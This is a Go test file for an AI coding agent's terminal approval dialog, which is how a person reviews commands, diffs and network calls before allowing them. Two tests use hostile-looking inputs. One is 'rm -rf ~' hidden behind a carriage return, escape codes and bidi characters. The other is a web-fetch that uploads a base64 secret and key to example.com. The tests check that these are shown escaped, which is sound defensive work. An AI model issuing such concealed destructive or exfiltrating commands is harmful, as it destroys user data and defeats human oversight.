package tui

import (
	"fmt"
	"strings"
	"testing"
	"time"

	tea "charm.land/bubbletea/v2"
	"github.com/charmbracelet/x/ansi"

	"spettro/internal/agent"
)

// reviewDiff is a new file of n lines as the runtime's unified diff, whose
// last line is long enough to wrap on any terminal and ends with a marker:
// reaching the marker means reaching the very end of the change.
func reviewDiff(n int) string {
	var b strings.Builder
	fmt.Fprintf(&b, "--- /dev/null\n+++ b/gen/big.go\n@@ -0,0 +1,%d @@\n", n)
	for i := 1; i < n; i++ {
		fmt.Fprintf(&b, "+line %04d of the generated file\n", i)
	}
	fmt.Fprintf(&b, "+last line %s END-OF-CHANGE\n", strings.Repeat("tail ", 40))
	return b.String()
}

func bigWriteApproval() agent.ShellApprovalRequest {
	return agent.ShellApprovalRequest{
		ToolID: "file-write", Command: "file-write gen/big.go",
		Reason: "file modification requires approval", Diff: reviewDiff(900),
	}
}

// pickerRows returns the picker's option rows as drawn, cursor marker
// included ("› Allow once", "  Deny").
func pickerRows(frame string) []string {
	var rows []string
	in := false
	for _, line := range strings.Split(ansi.Strip(frame), "\n") {
		line = strings.TrimRight(strings.Trim(line, "│"), " ")
		if strings.Contains(line, "allow this command?") {
			in = true
			continue
		}
		if in {
			if strings.TrimSpace(line) == "" || strings.HasPrefix(strings.TrimSpace(line), "╰") {
				break
			}
			rows = append(rows, strings.TrimSpace(line))
		}
	}
	return rows
}

// sameRows reports whether the picker rows drawn are the rows wanted, a
// drawn row being allowed to be the wanted one cut with "…" by a narrow
// dialog.
func sameRows(rows, want []string) bool {
	if len(rows) != len(want) {
		return false
	}
	for i := range rows {
		cut, isCut := strings.CutSuffix(rows[i], "…")
		if rows[i] != want[i] && (!isCut || !strings.HasPrefix(want[i], cut)) {
			return false
		}
	}
	return true
}

func press(t *testing.T, m Model, key tea.KeyPressMsg) Model {
	t.Helper()
	next, _ := m.Update(key)
	return next.(Model)
}

// When the whole call is on screen the picker is unchanged: four options,
// "Allow once" selected, so approving a short command costs no extra key.
func TestApprovalPickerWithEverythingVisible(t *testing.T) {
	for _, req := range []agent.ShellApprovalRequest{
		{ToolID: "bash", Command: "ls -la"},
		// Longer than the summary row, but the preview under it shows it
		// whole, wrapped.
		{ToolID: "bash", Command: "echo " + strings.Repeat("word ", 30)},
		{ToolID: "file-edit", Command: "file-edit a.go", Diff: "--- a/a.go\n+++ b/a.go\n@@ -1 +1 @@\n-x\n+y\n"},
	} {
		m := approvalModel(120, 40, req)
		m.syncApprovalReview()
		frame := m.View().Content
		rows := pickerRows(frame)
		want := []string{"› Allow once", approvalAlwaysLabel(req), "Deny", "Tell the agent what to do instead"}
		if !sameRows(rows, want) {
			t.Fatalf("%q: picker = %q, want %q", req.Command, rows, want)
		}
		response := m.pendingAuth.response
		m = press(t, m, tea.KeyPressMsg{Code: tea.KeyEnter})
		select {
		case resp := <-response:
			if resp.decision != agent.ShellApprovalAllowOnce || m.pendingAuth != nil {
				t.Fatalf("%q: enter answered %v, want allow once", req.Command, resp.decision)
			}
		default:
			t.Fatalf("%q: enter on the default did not answer", req.Command)
		}
	}
}

// Anything not on screen puts "Review full ..." first, selected, with "v"
// as its key; Enter opens the review and approves nothing.
func TestApprovalPickerOffersReviewWhenSomethingIsHidden(t *testing.T) {
	longPath := strings.Repeat("deep/", 30) + "name.go"
	cases := []struct {
		name  string
		req   agent.ShellApprovalRequest
		sizes [][2]int
		label string
	}{
		{"900-line diff", bigWriteApproval(), fitSizes, "Review full diff (v)"},
		{"heredoc over the preview cap", agent.ShellApprovalRequest{ToolID: "bash",
			Command: "cat <<'EOF' > x\n" + strings.Repeat("row\n", 40) + "EOF"}, fitSizes, "Review full command (v)"},
		{"long diff line", agent.ShellApprovalRequest{ToolID: "file-edit", Command: "file-edit a.go",
			Diff: "--- a/a.go\n+++ b/a.go\n@@ -1 +1 @@\n-x\n+" + strings.Repeat("y", 300) + "\n"}, fitSizes, "Review full diff (v)"},
		{"file path cut on the summary row", agent.ShellApprovalRequest{ToolID: "file-write", Command: "file-write " + longPath,
			Diff: "--- /dev/null\n+++ b/name.go\n@@ -0,0 +1 @@\n+x\n"}, [][2]int{{40, 15}, {80, 24}}, "Review full diff (v)"},
		{"network target on a short terminal", agent.ShellApprovalRequest{ToolID: "web-fetch",
			Command: "network web-fetch https://example.com/" + strings.Repeat("p", 300)}, [][2]int{{40, 15}}, "Review full request (v)"},
	}
	for _, tc := range cases {
		for _, size := range tc.sizes {
			m := approvalModel(size[0], size[1], tc.req)
			m.syncApprovalReview()
			frame := m.View().Content
			assertFrameFits(t, tc.name, frame, size[0], size[1])
			rows := pickerRows(frame)
			want := []string{"› " + tc.label, "Allow once", approvalAlwaysLabel(tc.req), "Deny", "Tell the agent what to do instead"}
			if !sameRows(rows, want) {
				t.Fatalf("%s at %v: picker = %q, want %q\n%s", tc.name, size, rows, want, ansi.Strip(frame))
			}
			response := m.pendingAuth.response
			m = press(t, m, tea.KeyPressMsg{Code: tea.KeyEnter})
			if m.pendingAuth == nil || !m.approvalReviewOpen {
				t.Fatalf("%s at %v: enter on the default did not open the review", tc.name, size)
			}
			if len(response) != 0 {
				t.Fatalf("%s at %v: opening the review answered the approval", tc.name, size)
			}
		}
	}
}

// The dialog says in words what it cannot show: a hidden preview as "N lines
// not shown - press v to review", a windowed or cut one on its footer, a cut
// summary row with a marker.
func TestApprovalDialogMarksWhatIsNotShown(t *testing.T) {
	m := approvalModel(40, 15, bigWriteApproval())
	m.syncApprovalReview()
	plain := ansi.Strip(m.View().Content)
	if !strings.Contains(plain, "lines not shown - ") && !strings.Contains(plain, "v review all") {
		t.Fatalf("40x15: nothing says the diff is not all shown:\n%s", plain)
	}
	if strings.Contains(plain, "preview hidden") {
		t.Fatalf("the old silent marker is back:\n%s", plain)
	}

	// During a run the working indicator takes the footer's row at 40x15;
	// the picker's title says it instead.
	for _, size := range [][2]int{{40, 15}, {50, 16}} {
		m = approvalModel(size[0], size[1], bigWriteApproval())
		footerTodos(&m, 10)
		m.thinking = true
		m.agentStartAt = time.Now()
		m.syncApprovalReview()
		m = m.recalcLayout()
		frame := m.View().Content
		assertFrameFits(t, "approval during a run", frame, size[0], size[1])
		plain = ansi.Strip(frame)
		if !strings.Contains(plain, "lines not shown - ") && !strings.Contains(plain, "v review all") {
			t.Fatalf("%v during a run: nothing says the diff is not shown:\n%s", size, plain)
		}
		if !strings.Contains(plain, "› Review full diff (v)") {
			t.Fatalf("%v during a run: the review is not selected:\n%s", size, plain)
		}
	}

	// No room at all for the preview: the footer alone says how much.
	lay := approvalLayout{previewTotal: 899}
	if got := approvalFooterText(lay, false, 80); got != "899 lines not shown - press v to review" {
		t.Fatalf("hidden preview footer = %q", got)
	}
	if got := approvalFooterText(lay, false, 34); got != "899 lines not shown - v to review" {
		t.Fatalf("narrow hidden preview footer = %q", got)
	}
	lay = approvalLayout{previewTotal: 40, previewRows: 40, overflow: true}
	if got := approvalFooterText(lay, false, 80); !strings.Contains(got, "long lines cut · v review all") {
		t.Fatalf("cut lines footer = %q", got)
	}

	m = approvalModel(80, 24, agent.ShellApprovalRequest{ToolID: "file-write",
		Command: "file-write " + strings.Repeat("deep/", 30) + "name.go", Diff: "--- /dev/null\n+++ b/name.go\n@@ -0,0 +1 @@\n+x\n"})
	if !strings.Contains(ansi.Strip(m.View().Content), "name.go"+approvalCutMarker) {
		t.Fatalf("a cut summary row has no marker:\n%s", ansi.Strip(m.View().Content))
	}
}

// Once offered, the review stays for that request: a terminal that grows
// (or a preview expanded to show everything) must not take the row away and
// move every option under the cursor.
func TestApprovalReviewOfferIsStableAcrossResize(t *testing.T) {
	req := agent.ShellApprovalRequest{ToolID: "bash", Command: "cat <<'EOF' > x\n" + strings.Repeat("row\n", 12) + "EOF"}
	m := approvalModel(40, 15, req)
	m = press(t, m, tea.KeyPressMsg{Code: tea.KeyDown})
	if m.approvalChoice != approvalActAllowOnce {
		t.Fatalf("down from the review selected %v, want allow once", m.approvalChoice)
	}
	next, _ := m.Update(tea.WindowSizeMsg{Width: 200, Height: 60})
	m = next.(Model)
	m = press(t, m, tea.KeyPressMsg{Code: 'o', Mod: tea.ModCtrl})
	rows := pickerRows(m.View().Content)
	if len(rows) != 5 || rows[1] != "› Allow once" {
		t.Fatalf("after growing the terminal the picker is %q", rows)
	}
	response := m.pendingAuth.response
	m = press(t, m, tea.KeyPressMsg{Code: tea.KeyEnter})
	if m.pendingAuth != nil {
		t.Fatal("enter on allow once did not answer")
	}
	if resp := <-response; resp.decision != agent.ShellApprovalAllowOnce {
		t.Fatalf("answered %v, want allow once", resp.decision)
	}
}

// The review shows everything, at 40x15 as at 80x24: every row inside the
// terminal, and scrolling reaches the very last line of a 900-line diff,
// including the part of it that wraps.
func TestApprovalReviewReachesTheEnd(t *testing.T) {
	for _, size := range [][2]int{{40, 15}, {80, 24}, {120, 40}} {
		m := approvalModel(size[0], size[1], bigWriteApproval())
		m = press(t, m, tea.KeyPressMsg{Code: 'v', Text: "v"})
		if !m.approvalReviewOpen {
			t.Fatalf("%v: v did not open the review", size)
		}
		frame := m.View().Content
		assertFrameFits(t, "review top", frame, size[0], size[1])
		plain := ansi.Strip(frame)
		for _, want := range []string{"Review full diff · file-write", "file-write", "gen/big.go", "rows 1-", "esc back"} {
			if !strings.Contains(plain, want) {
				t.Fatalf("%v: %q missing from the review:\n%s", size, want, plain)
			}
		}

		// Page through the whole document: every row of it must be shown
		// on some page, in order, and the last page must be the end.
		doc := m.approvalReviewDoc(approvalReviewContentWidth(size[0]))
		seen := map[int]bool{}
		for range len(doc) {
			start := m.approvalReviewScroll
			frame = m.View().Content
			assertFrameFits(t, "review page", frame, size[0], size[1])
			for i := start; i < min(start+m.approvalReviewBodyRows(), len(doc)); i++ {
				if !strings.Contains(frame, doc[i]) {
					t.Fatalf("%v: doc row %d not on the page starting at %d", size, i, start)
				}
				seen[i] = true
			}
			m = press(t, m, tea.KeyPressMsg{Code: tea.KeyPgDown})
			if m.approvalReviewScroll == start {
				break
			}
		}
		if len(seen) != len(doc) {
			t.Fatalf("%v: paging showed %d of %d rows", size, len(seen), len(doc))
		}
		plain = ansi.Strip(m.View().Content)
		// The last line wraps: its rows joined, without the blank gutter.
		joined := strings.Join(strings.Fields(plain), "")
		if !strings.Contains(joined, "END-OF-CHANGE") || !strings.Contains(plain, "end of diff") || !strings.Contains(plain, "· end") {
			t.Fatalf("%v: the last page does not show the end of the change:\n%s", size, plain)
		}
		if !strings.Contains(plain, " 900 ") && !strings.Contains(plain, "900 +") {
			// The line number of the last line is in its gutter.
			t.Fatalf("%v: line 900 is not numbered on the last page:\n%s", size, plain)
		}

		// Home and End jump; Esc returns to the dialog, review marked seen,
		// cursor on "Allow once".
		m = press(t, m, tea.KeyPressMsg{Code: tea.KeyHome})
		if m.approvalReviewScroll != 0 {
			t.Fatalf("%v: home left the review at row %d", size, m.approvalReviewScroll)
		}
		m = press(t, m, tea.KeyPressMsg{Code: tea.KeyEnd})
		if !strings.Contains(strings.Join(strings.Fields(ansi.Strip(m.View().Content)), ""), "END-OF-CHANGE") {
			t.Fatalf("%v: end did not reach the last line", size)
		}
		m = press(t, m, tea.KeyPressMsg{Code: tea.KeyEscape})
		if m.approvalReviewOpen || m.pendingAuth == nil || !m.pendingAuth.reviewed {
			t.Fatalf("%v: esc did not return to the dialog with the review seen", size)
		}
		rows := pickerRows(m.View().Content)
		if len(rows) != 5 || !strings.HasSuffix(rows[0], "seen") || rows[1] != "› Allow once" {
			t.Fatalf("%v: after the review the picker is %q", size, rows)
		}
	}
}

// A command's review numbers its lines and wraps a long one; the mouse
// wheel scrolls it.
func TestApprovalReviewOfACommand(t *testing.T) {
	command := "cat <<'EOF' > out.txt\n" + strings.Repeat("row of text\n", 60) + strings.Repeat("Z", 150) + "TAIL\nEOF"
	m := approvalModel(40, 15, agent.ShellApprovalRequest{ToolID: "bash", Command: command, Reason: "non-whitelisted command"})
	m = press(t, m, tea.KeyPressMsg{Code: 'v', Text: "v"})
	plain := ansi.Strip(m.View().Content)
	if !strings.Contains(plain, "Review full command · bash") || !strings.Contains(plain, "command · 63 lines") {
		t.Fatalf("review header:\n%s", plain)
	}
	next, _ := m.Update(tea.MouseWheelMsg{Button: tea.MouseWheelDown})
	if next.(Model).approvalReviewScroll != 3 {
		t.Fatalf("the wheel scrolled to %d, want 3", next.(Model).approvalReviewScroll)
	}
	m = press(t, m, tea.KeyPressMsg{Code: tea.KeyEnd})
	frame := m.View().Content
	assertFrameFits(t, "command review", frame, 40, 15)
	plain = ansi.Strip(frame)
	if !strings.Contains(plain, "TAIL") || !strings.Contains(plain, "63  EOF") {
		t.Fatalf("the end of the command is not reachable:\n%s", plain)
	}
	// The 154-character line is all there, over several rows.
	joined := strings.Join(strings.Fields(plain), "")
	if !strings.Contains(joined, strings.Repeat("Z", 60)+"TAIL") {
		t.Fatalf("the long line lost characters:\n%s", plain)
	}
}

// A command whose lines are hard-wrapped in the preview is counted in rows,
// not lines: an 83-line heredoc wrapped onto 243 rows of a 40-column dialog
// used to read "243 lines not shown", and at 80 columns "lines 1-4 of 163".
// A diff, one row per line, keeps saying lines.
func TestApprovalPreviewCountsWrappedRowsAsRows(t *testing.T) {
	heredoc := "cat <<'EOF' > out.txt\n" + strings.Repeat("heredoc line "+strings.Repeat("z", 60)+"\n", 81) + "EOF"
	req := agent.ShellApprovalRequest{ToolID: "bash", Command: heredoc, Reason: "non-whitelisted command"}
	for _, size := range [][2]int{{40, 15}, {80, 24}, {120, 40}} {
		m := approvalModel(size[0], size[1], req)
		m.syncApprovalReview()
		plain := ansi.Strip(m.View().Content)
		lay := m.approvalLayout(m.approvalContentWidth())
		if !lay.wrapped {
			if size[0] < 120 {
				t.Fatalf("%v: the heredoc lines should wrap in the preview", size)
			}
			continue
		}
		if strings.Contains(plain, "lines not shown") || strings.Contains(plain, "lines 1-") {
			t.Errorf("%v: wrapped rows counted as lines:\n%s", size, plain)
		}
		if !strings.Contains(plain, "rows not shown") && !strings.Contains(plain, "rows 1-") {
			t.Errorf("%v: nothing counts the preview rows:\n%s", size, plain)
		}
	}
	m := approvalModel(80, 24, bigWriteApproval())
	m.syncApprovalReview()
	if plain := ansi.Strip(m.View().Content); !strings.Contains(plain, "lines 1-") {
		t.Errorf("a diff preview should count lines:\n%s", plain)
	}
}

// The review shows what the preview shows: control, bidi and zero-width
// characters made visible, never interpreted.
func TestApprovalReviewShowsHiddenCharacters(t *testing.T) {
	command := "echo safe\rrm -rf ~ \x1b[8m hidden\x1b[0m \u202eevil\u202c zero\u200bwidth \xff"
	diffText := "--- a/a.sh\n+++ b/a.sh\n@@ -1 +1 @@\n-old\n+new\u202e\x1b[2Jline\rcovered\n"
	for _, req := range []agent.ShellApprovalRequest{
		{ToolID: "bash", Command: command},
		{ToolID: "file-edit", Command: "file-edit a.sh", Diff: diffText},
	} {
		for _, size := range [][2]int{{40, 15}, {80, 24}} {
			m := approvalModel(size[0], size[1], req)
			m = press(t, m, tea.KeyPressMsg{Code: 'v', Text: "v"})
			m = press(t, m, tea.KeyPressMsg{Code: tea.KeyEnd})
			var all strings.Builder
			for _, row := range m.approvalReviewDoc(approvalReviewContentWidth(size[0])) {
				all.WriteString(ansi.Strip(row))
			}
			text := all.String()
			for _, bad := range []string{"\r", "\x1b", "\u202e", "\u200b", "\xff"} {
				if strings.Contains(text, bad) {
					t.Fatalf("%s at %v: the review holds a raw %q", req.ToolID, size, bad)
				}
			}
			wants := []string{"^M", "^[", "\\u202e"}
			if req.ToolID == "bash" {
				wants = append(wants, "\\u200b", "\\xff", "^[[8m")
			}
			flat := strings.ReplaceAll(text, " ", "")
			for _, want := range wants {
				if !strings.Contains(flat, strings.ReplaceAll(want, " ", "")) {
					t.Fatalf("%s at %v: %q is not shown escaped: %q", req.ToolID, size, want, text)
				}
			}
			assertFrameFits(t, "sanitized review", m.View().Content, size[0], size[1])
		}
	}
}

// The review of a network call names the whole target.
func TestApprovalReviewOfANetworkCall(t *testing.T) {
	target := "https://example.com/upload?payload=" + strings.Repeat("c2VjcmV0", 30) + "&key=SECRETTAIL"
	m := approvalModel(40, 15, agent.ShellApprovalRequest{Command: "network web-fetch " + target})
	m = press(t, m, tea.KeyPressMsg{Code: 'v', Text: "v"})
	var all strings.Builder
	for _, row := range m.approvalReviewDoc(approvalReviewContentWidth(40)) {
		all.WriteString(strings.TrimSpace(strings.TrimPrefix(ansi.Strip(row), "target")))
	}
	if !strings.Contains(all.String(), target) {
		t.Fatalf("the review does not hold the whole target: %q", all.String())
	}
}
